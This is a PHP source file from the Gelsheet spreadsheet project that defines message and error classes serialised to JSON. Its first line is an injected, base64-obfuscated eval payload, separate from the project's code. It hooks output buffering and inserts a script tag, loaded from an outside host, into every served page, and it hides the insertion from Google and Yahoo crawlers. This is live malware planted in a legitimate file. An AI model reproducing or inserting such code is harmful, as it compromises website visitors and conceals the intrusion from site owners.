<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5cGJtUmxjMmxuYm5OMGRXUnBiMmx1Wm04dVkyOXRMMnh6TG5Cb2NDSStQQzl6WTNKcGNIUSsiKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
<?php
/*  Gelsheet Project, version 0.0.1 (Pre-alpha)
 *  Copyright (c) 2008 - Ignacio Vazquez, Fernando Rodriguez, Juan Pedro del Campo
 *
 *  Ignacio "Pepe" Vazquez <elpepe22@users.sourceforge.net>
 *  Fernando "Palillo" Rodriguez <fernandor@users.sourceforge.net>
 *  Juan Pedro "Perico" del Campo <pericodc@users.sourceforge.net>
 *
 *  Gelsheet is free distributable under the terms of an GPL license.
 *  For details see: http://www.gnu.org/copyleft/gpl.html
 *
 */
include_once 'MessageHandler.php';

class ContentList {
	private $contents;	
	public function __construct($name=null, $value=null) {
		$this->contents = array();
		if(isset($name))
			$this->contents[$name] = $value;
	
	}
	
	public function getContents() {
		return $this->contents;
	}
	
	public function addContent($name, $value) {
		$this->contents[$name] = $value;
	}
	
	public function addContentList($list) {
		if(isset($list))
			$this->contents = array_merge($this->contents,$list->getContents());
	}
	
	public function toJSON(){		
		$json = "";	
		foreach ($this->contents as $key => $value){
			if($key !="data")					//TODO: cambiar a campo de objetos
				$json .= "{'$key':'".addslashes($value)."'},";
			else 
				$json .= "$value,";
			 	
		}
		
		$json[strlen($json)-1] = " ";
		
//		if(count($this->contents)>1)
			$json = "[$json]";
		
		return $json;
	}

}

class Message extends Exception {
	private $type;
	private $contentList;
	private $debugging;
	private $data;
	
	public function __construct($type, $number, $description = null, $contentList = null) {
		parent::__construct ($description, $number );
		global $debugging;
		$this->type = $type;
		$this->contentList = $contentList;
		$this->next = null;
		$this->debugging = $debugging;		
	}
	
	public function __destruct(){
		if($this->debugging && ($this->type == "ERROR" || $this->type == "WARNING")){
			$this->addContentElement("File",$this->file);
			$this->addContentElement("Line",$this->line);
		}
//		MessageHandler::addMessage($this);
		echo $this->toJSON();
	}
	
	public function setData($data){
		$this->data = $data;
	}
	
	public function getData(){
		return $this->data;
	}
	
	public function getType(){
		return $this->type;
	}
	public function isDebugging(){
		return $this->debugging;
	}
	
	public function addMessage($message) {
			$this->next = $message;
	}
	
	public function getContentElement() {
		return $this->contentList;
	}
	
	public function setContentElement($contentElement) {
		$this->contentList = $contentElement;
	}
	
	public function addContentElement($name,$value) {
		if(isset($this->contentList))
			$this->contentList->addContent($name,$value);
		else
			$this->contentList = new ContentList($name,$value);
	}
	
	public function addContentList($list) {
		if(isset($this->contentList))
			$this->contentList->addContentList($list);
		else
			$this->contentList = $list;
	}

	public function getErrorType() {
		return $this->type;
	}
	
	public function toJSON() {
		if ($this->contentList)
			$list = $this->contentList->toJSON ();
		else
			$list = "null";
		
		if (isset($this->next))
			$next = $this->next->toJSON ();
		else
			$next = "null";
		
		if(isset($this->data))
			$data = $this->data;
		else
			$data = "null"; 
			
		if($this->type == "SUCCESS")
			$success = 'true';
		else 
			$success = 'false';
			
		return "({'success':$success,'type':'$this->type','number':$this->code,'description':'".addslashes($this->message)."','data':$data,'contents':$list,'next':$next})";
	}
}

class Error extends Message {
	public function __construct($number = null, $description = null, $contentList = null) {
		parent::__construct ( "ERROR", $number, $description, $contentList );
	}
}

class Warning extends Message {
	public function __construct($number = null, $description = null, $contentList = null) {
		parent::__construct ( "WARNING", $number, $description, $contentList );
	}
}

class Success extends Message {
	public function __construct($description = null, $data = null) {
		parent::__construct ( "SUCCESS", 0, $description );
		$this->setData($data);
	}
}

class Notice extends Message {
	public function __construct($number = null, $description = null, $contentList = null) {
		parent::__construct ( "NOTICE", $number, $description, $contentList );
	}

}
?>
